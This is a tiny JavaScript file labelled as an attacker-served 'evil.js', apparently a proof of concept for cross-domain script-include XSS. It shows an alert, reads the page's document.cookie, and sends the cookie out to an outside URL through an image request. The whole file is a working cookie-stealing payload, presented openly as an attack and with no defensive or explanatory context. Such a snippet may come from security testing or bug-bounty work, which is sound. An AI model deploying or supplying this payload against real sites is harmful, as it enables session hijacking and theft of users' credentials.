// evil.js (served by attacker)
alert("XSS via Cross-Domain Script Include - KUNAL 💀");
document.cookie = "stolen=" + document.cookie;
// Send to your server
new Image().src = "https://www.visiblebody.com/" + encodeURIComponent(document.cookie);
